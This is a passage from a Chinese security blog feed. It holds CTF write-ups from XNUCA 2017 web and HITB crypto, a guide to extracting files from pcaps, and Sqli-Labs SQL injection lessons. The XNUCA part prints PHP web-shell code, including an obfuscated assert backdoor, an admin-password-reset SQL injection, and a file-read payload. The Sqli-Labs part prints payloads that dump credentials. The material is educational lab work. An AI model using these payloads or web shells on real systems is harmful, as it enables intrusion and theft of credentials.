<p>查到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/40756/</div></pre></td></tr></table></figure></p>
<p>利用里面的exp进行获取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# cat /etc/flag.txt</div><div class="line">xnuca&#123;123e5ebb3f34a07990e477e85eb60170&#125;</div><div class="line"></div><div class="line"></div><div class="line">0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# echo &quot;a&quot; &gt; ../writeHere/00111e86d51fa2b62add879572a0d29e</div><div class="line"></div><div class="line"></div><div class="line">0x4148@96433e53a974329f13590be3e215aebd.xnuca.cn# ls ../writeHere/</div><div class="line">00111e86d51fa2b62add879572a0d29e</div></pre></td></tr></table></figure></p>
<h1 id="No-11-两只小蜜蜂啊"><a href="#No-11-两只小蜜蜂啊" class="headerlink" title="No.11 两只小蜜蜂啊"></a>No.11 两只小蜜蜂啊</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">adee757b88f7716820dc6d9bec43684d.xnuca.cn</div><div class="line"></div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
<p>查到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://bbs.ichunqiu.com/thread-13977-1-1.html</div></pre></td></tr></table></figure></p>
<p>利用文章里的exp，成功获取到shell。然后就拿到flag了。不过忘记截图了。</p>
<h1 id="No-12-社工库"><a href="#No-12-社工库" class="headerlink" title="No.12 社工库"></a>No.12 社工库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">关键字词：二档靶标题</div><div class="line">===============================================================</div><div class="line"></div><div class="line">社工之余吃个芒果休息一下吧！</div></pre></td></tr></table></figure>
<p>没做出来。</p>
<h1 id="No-18-“开讲啦”"><a href="#No-18-“开讲啦”" class="headerlink" title="No.18 “开讲啦”"></a>No.18 “开讲啦”</h1><p>查到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/24869/</div></pre></td></tr></table></figure></p>
<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://8d52640a73d8073066c951df0501184a.xnuca.cn/oauth/lti/common/tool_provider_outcome.php</div><div class="line"></div><div class="line">POST:</div><div class="line">grade=1&amp;key=1&amp;secret=secret&amp;sourcedid=1&amp;submit=Send%20Grade&amp;url=/etc/flag.txt</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;Co8n0g5r72a4tul3at2ions!Y0ug0tMe&#125;</div></pre></td></tr></table></figure></p>
<p>但是因为只找到任意文件读取漏洞，所以只能做读取flag的操作。写的操作没有成功。</p>
<h1 id="No-23-找入口"><a href="#No-23-找入口" class="headerlink" title="No.23 找入口"></a>No.23 找入口</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.websecgeeks.com/2015/08/wolf-cms-arbitrary-file-upload-to.html</div></pre></td></tr></table></figure>
<p>弱密码：admin：admin 登陆后直接上传k.php，内容为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'AAA'</span>]) <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问，写入文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=file_put_contents(&quot;writeHere/00111e86d51fa2b62add879572a0d29e&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;);</div></pre></td></tr></table></figure></p>
<p>访问，读取flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://cef033ea85498682c1c33309def1a109.xnuca.cn/public/k.php?AAA=system(&quot;cat /etc/flag.txt&quot;);</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;24567gtfvretyasdsgrtyjyufdgrth23&#125;</div></pre></td></tr></table></figure></p>
<h1 id="No-24-可爱的星星"><a href="#No-24-可爱的星星" class="headerlink" title="No.24 可爱的星星"></a>No.24 可爱的星星</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">37af3efae1d906343d29b6b1a96fcd54.xnuca.cn</div><div class="line"></div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
<p>没做出来。</p>
<h1 id="No-25-愉快的玩耍吧"><a href="#No-25-愉快的玩耍吧" class="headerlink" title="No.25 愉快的玩耍吧"></a>No.25 愉快的玩耍吧</h1><p>重置Admin密码为1234567：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</div></pre></td></tr></table></figure>
<p>登录，并上传一个压缩了一句话php文件的压缩包到以下地址，会自动解压</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/include/uploadify.php?type=skin&amp;wate=undefined&amp;module=undefined&amp;lang=cn</div></pre></td></tr></table></figure>
<p>插入一句话的代码是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $e = $_REQUEST[<span class="string">'e'</span>]; $arr = <span class="keyword">array</span>($_REQUEST[<span class="string">'pass'</span>],); array_filter($arr, base64_decode($e)); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>用以下地址得到shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/templates/test.php?e=YXNzZXJ0</div></pre></td></tr></table></figure>
<p>然后读取/etc/flag.txt，并写入文件即可。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>吐槽点：</p>
<ul>
<li>比赛服务器：）</li>
<li>扫一扫就被办：）</li>
<li>重点是找poc/exp…..</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XNUCA2017-第一期：Web-writeup 难度中等偏下&lt;/p&gt;
&lt;p&gt;题目类型：CTF题，渗透/模板题&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>流量包提取文件方法</title>
    <link href="http://yoursite.com/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2017/08/25/流量包提取文件方法/</id>
    <published>2017-08-25T09:18:24.000Z</published>
    <updated>2017-08-25T10:30:59.016Z</updated>
    
    <content type="html"><![CDATA[<p>流量包提取文件方法<br><a id="more"></a></p>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>wrieshark自带有文件分离功能。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/3.png?raw=true" alt=""></p>
<h1 id="tcpxtract"><a href="#tcpxtract" class="headerlink" title="tcpxtract"></a>tcpxtract</h1><p>通过下面命令安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tcpxtract</div></pre></td></tr></table></figure></p>
<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcpxtract -f XXX.pcap</div></pre></td></tr></table></figure></p>
<p>以hitctf2017的Cephalopod为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/Cephalopod# tcpxtract -f 2a9c1cdd-2ac0-4b2a-828d-269c6e04ebbb.pcap</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000000.png</div><div class="line">Found file of type &quot;png&quot; in session [10.0.2.7:49818 -&gt; 10.0.2.10:36890], exporting to 00000001.png</div></pre></td></tr></table></figure></p>
<p>即可得到藏在流量包里的文件：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/1.png?raw=true" alt=""></p>
<h1 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h1><p>foremost是基于文件头及尾部信息恢复文件的工具。</p>
<p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foremost -i XXX.pcap</div></pre></td></tr></table></figure></p>
<p>以hitbctf2017的simple_transfer为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# foremost -i b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">Processing: b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap</div><div class="line">|*|</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# ls</div><div class="line">b48bfaf7-d728-4ae3-94b7-cd8b2e6e9077.pcap  output</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer# cd output/</div><div class="line">root@chybeta:~/Desktop/hitb2017/misc/simple_transfer/output# ls</div><div class="line">audit.txt  pdf</div></pre></td></tr></table></figure>
<p>即可恢复出藏在流量包里的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/2.png?raw=true" alt=""></p>
<h1 id="Network-miner"><a href="#Network-miner" class="headerlink" title="Network miner"></a>Network miner</h1><p>下载地址：<a href="https://sourceforge.net/projects/networkminer/" target="_blank" rel="external">https://sourceforge.net/projects/networkminer/</a></p>
<p>还有一些方法，遇到后再慢慢补充。</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://bbs.pediy.com/thread-220021.htm" target="_blank" rel="external">CTF取证类题目指南</a></li>
<li><a href="http://bobao.360.cn/learning/detail/206.html" target="_blank" rel="external">返璞归真——流量中提取文件的五种方法</a></li>
<li><a href="https://www.blackbytes.info/2012/01/four-ways-to-extract-files-from-pcaps/" target="_blank" rel="external">Four ways to extract files from pcaps</a></li>
<li><a href="https://github.com/caesar0301/awesome-pcaptools" target="_blank" rel="external">awesome-pcaptools</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;流量包提取文件方法&lt;br&gt;
    
    </summary>
    
      <category term="技术杂谈" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="pcap" scheme="http://yoursite.com/tags/pcap/"/>
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>HITB CTF 2017-Dating in Singapore-writeup</title>
    <link href="http://yoursite.com/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/"/>
    <id>http://yoursite.com/2017/08/24/HITB-CTF-2017-Dating-in-Singapore-writeup/</id>
    <published>2017-08-24T08:58:25.000Z</published>
    <updated>2017-08-25T10:30:52.002Z</updated>
    
    <content type="html"><![CDATA[<p>HITB CTF 2017-Dating in Singapore-writeup<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>根据分隔符<code>-</code>分开每行，并且两两数字一组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div><div class="line"></div><div class="line">05 06 07 13 20 27 16 27 28</div><div class="line"></div><div class="line">01 02 03 02 09 16 23 30</div><div class="line"></div><div class="line">02 09 16 23 02 03 10 09 09 10 17 24 23</div><div class="line"></div><div class="line">02 01 08 14 22 29 30</div><div class="line"></div><div class="line">06 05 04 11 18 25 26 27</div><div class="line"></div><div class="line">02 03 04 03 10 17 24 31</div><div class="line"></div><div class="line">01 02 03 01 08 15 22 29 15 16 17</div><div class="line"></div><div class="line">04 05 06 04 11 18 25 18 19 20</div><div class="line"></div><div class="line">01 08 15 22 29 30 31 24 17 10 03</div><div class="line"></div><div class="line">26 19 12 05 20 28 21 14 07</div><div class="line"></div><div class="line">04 05 12 13 19 26 25</div></pre></td></tr></table></figure></p>
<p>数字的特征，最小为01，最大为31，一共十二行，恰对应12个月，每个月最多31天。结合今年（2017）日历</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170824/1.png?raw=true" alt=""></p>
<p>第一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01 08 15 22 29 15 16 17 03 10 17 24 31</div></pre></td></tr></table></figure></p>
<p>对照一月份，“写出”得到字母：<code>H</code>。</p>
<p>其余类似。</p>
<p>最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HITB&#123;CTFFUN&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HITB CTF 2017-Dating in Singapore-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less17-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/</id>
    <published>2017-08-23T10:16:52.000Z</published>
    <updated>2017-08-23T13:46:04.707Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-17 POST-Update Query-Error Based-String<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>三种基本语句。</p>
<h2 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT INTO table_name ( field1, field2,...fieldN )</div><div class="line">                       VALUES</div><div class="line">                       ( value1, value2,...valueN );</div></pre></td></tr></table></figure>
<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc users;</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| Field    | Type        | Null | Key | Default | Extra          |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</div><div class="line">| username | varchar(20) | NO   |     | NULL    |                |</div><div class="line">| password | varchar(20) | NO   |     | NULL    |                |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">3 rows in set (0.06 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure></p>
<h2 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</div><div class="line">[WHERE Clause]</div></pre></td></tr></table></figure>
<p>示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;atebyhc&quot; where id=15;                     </div><div class="line">Query OK, 1 row affected (0.08 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | atebyhc  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15;  </div><div class="line">Query OK, 1 row affected (0.00 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | atebyhc  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE table_name ;</div></pre></td></tr></table></figure>
<p>这个。。暂时先不演示了。。</p>
<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h1><p>这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=新密码 where username=账号；</div></pre></td></tr></table></figure></p>
<p>我们post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>则发现有报错回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</div></pre></td></tr></table></figure></p>
<p>为单引号，所以可以推测语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;；</div></pre></td></tr></table></figure></p>
<p>接下去进行报错注入。</p>
<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>(以上来自<a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">学习笔记 UpdateXml() MYSQL显错注入</a>)</p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>可以获取数据库名为：security。</p>
<p>但要获取数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>却会显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</div></pre></td></tr></table></figure></p>
<p>也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。</p>
<p>这个可以先新建一张表，然后再在这个新建的临时表中进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>这在sql.log中的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
<p>其中<code>(select * from users)tmp</code>新建了一张tmp表，外面的<code>SELECT...FROM..</code>是从tmp中获取数据。</p>
<p>updatexml有长度限制,最长32位</p>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>得到数据库名称为 security</p>
<p>查字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>获取账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>对应的后端查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
<p>extractvalue也有长度限制,最长32位</p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://static.hx99.net/static/drops/tips-2078.html" target="_blank" rel="external">利用insert，update和delete注入获取数据</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
&lt;p&gt;Less-17 POST-Update Query-Error Based-String&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Sqli-Labs:Less15~16-writeup</title>
    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/"/>
    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/</id>
    <published>2017-08-23T09:42:39.000Z</published>
    <updated>2017-08-23T10:16:14.267Z</updated>
    
    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
<p>Less-15 POST- Blind-Boolian/time Based -Single quotes<br>Less-16 POST- Blind-Boolian/time Based -Double quotes<br><a id="more"></a></p>
<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less 15"></a>Less 15</h1><p>这关是盲注。没有回显。</p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos; and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>之后根据页面的登陆与否，即是否有flag.jpg图片出现。构造逻辑语句利用脚本注入。</p>
<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less 16"></a>Less 16</h1><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;) and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
<p>登陆成功。</p>
<p>之后根据页面的登陆与否，构造逻辑语句利用脚本注入。</p>
<p>下面给个基于Less 16的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div 